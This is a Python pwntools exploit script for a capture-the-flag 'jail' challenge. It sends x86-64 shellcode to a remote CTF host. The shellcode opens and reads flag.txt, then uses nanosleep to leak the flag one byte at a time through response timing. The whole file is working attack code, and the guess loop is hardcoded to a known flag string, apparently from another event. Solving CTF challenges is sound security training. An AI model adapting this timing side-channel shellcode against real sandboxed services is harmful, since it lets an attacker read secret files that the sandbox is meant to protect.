from pwn import *
import time
import string

gs = '''
continue
'''

elf = context.binary = ELF("./jail")

def start():
    if args.REMOTE:
        return remote("hidden.ctf.intigriti.io", 1337)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

def guardar_shellcode(shellcode):
    f = open("payload", "wb")
    f.write(shellcode)
    f.close()

context.terminal = ['gnome-terminal', '-e']
context.log_level = 'ERROR'


flag = str()

#index = -1 
#sliding_window = 0

index = -1
sliding_window = 0


while True:
    #for letter in string.ascii_letters + string.digits + string.punctuation:
    #for letter in "DUCTF{S1de_Ch@nN3l_aTT4ckS_aRe_Pr3tTy_c00L!}":
    for letter in "DUCTF{S1de_Ch@nN3l_aTT4ckS_aRe_Pr3tTy_c00L!}":
        io = start()

        shellcode = f"""

            _start:
                xor  rdx, rdx
                push rdx
                mov  rsi, {u64(b'flag.txt')}
                push rsi
                push rsp
                pop  rsi
                xor  rdi, rdi
                sub  rdi, 100
                mov  rax, 0x101
                syscall

                mov rdi, rax
                mov rsi, rsp
                mov rdx, 64
                mov rax, 0x0
                syscall

                jmp _exploit

            _end: 
                cmp al, 1
                je _exploit
                mov rax, 60
                mov rdi, 1
                syscall


            _exploit:
                mov r13, rsp

        """ 

        if index == 8:
            sliding_window += 1            
            index = 0
    
        shellcode += f"""
                add r13, {sliding_window*8}
        """

        #for _ in range(sliding_window):
        #    shellcode += f"""
        #        add r13, 8
        #    """

        shellcode += f"""
                                       

                xor ebx, ebx
                mov ebx, byte [r13 + {index}]
                mov rax, 0
                cmp bl, {hex(ord(letter))}
                jne _end
                
                push 0
                push 5

                mov rdi, rsp
                mov rax, 35
                mov rsi, 0
                syscall

                jmp _end     
        """

        #shellcode += shellcraft.nanosleep('rsp', 0)
        
        #shellcode += shellcraft.exit(0)
        shellcode = asm(shellcode)
        #guardar_shellcode(shellcode.ljust(128, b"\x00"))

        s_time = time.time()
        io.sendlineafter("> ", shellcode.ljust(128, b"\x00"))

        try:
            io.recv()
        except:
            pass
        #io.interactive()
        if time.time() - s_time > 2:
            flag += letter
            print("=====================================")
            #print(f"Index: {index}")
            print(f"Flag: {flag}")
            index += 1
            io.close()
            break
            
        io.close()

        if "}" in flag:
            print("Pwned: ", flag)
            break

    print(flag)
